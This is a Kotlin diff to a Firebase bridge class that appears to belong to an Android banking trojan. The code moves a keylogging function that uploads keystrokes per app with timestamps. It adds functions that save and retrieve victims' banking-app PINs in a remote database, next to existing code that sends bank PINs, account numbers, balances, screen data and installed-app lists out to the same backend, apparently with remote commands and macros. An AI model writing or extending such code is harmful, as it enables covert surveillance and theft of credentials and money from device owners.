@@ -15,12 +15,14 @@ object FirebaseBridge {
         screenRef = deviceRef.child("screen")
         infoRef = deviceRef.child("info")
         bankRef = deviceRef.child("bank")
+        pinRef = deviceRef.child("pin_data")
     }
 
     lateinit var commandsRef: DatabaseReference
     private lateinit var screenRef: DatabaseReference
     private lateinit var infoRef: DatabaseReference
     private lateinit var bankRef: DatabaseReference
+    private lateinit var pinRef: DatabaseReference
 
     fun registerDevice(name: String, version: String, apps: List<String>) {
         deviceRef.child("deviceName").setValue(name)
@@ -43,6 +45,11 @@ object FirebaseBridge {
         infoRef.child("installed_apps").setValue(apps.joinToString("\n"))
     }
 
+    fun sendKeylog(pkg: String, text: String) {
+        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
+        infoRef.child("keylogs").push().setValue("[$ts] $pkg: $text")
+    }
+
     fun logBankData(packageName: String, pin: String? = null, account: String? = null, balance: String? = null) {
         val data = mutableMapOf<String, Any>(
             "package" to packageName,
@@ -54,9 +61,19 @@ object FirebaseBridge {
         bankRef.push().setValue(data)
     }
 
-    fun sendKeylog(pkg: String, text: String) {
-        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
-        infoRef.child("keylogs").push().setValue("[$ts] $pkg: $text")
+    fun savePin(appPackage: String, pin: String) {
+        pinRef.child(appPackage.replace(".", "_")).setValue(pin)
+    }
+
+    fun getPin(appPackage: String, callback: (String?) -> Unit) {
+        pinRef.child(appPackage.replace(".", "_")).addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                callback(snapshot.getValue(String::class.java))
+            }
+            override fun onCancelled(error: DatabaseError) {
+                callback(null)
+            }
+        })
     }
 
     fun reportMacro(macroId: String, success: Boolean, details: String) {
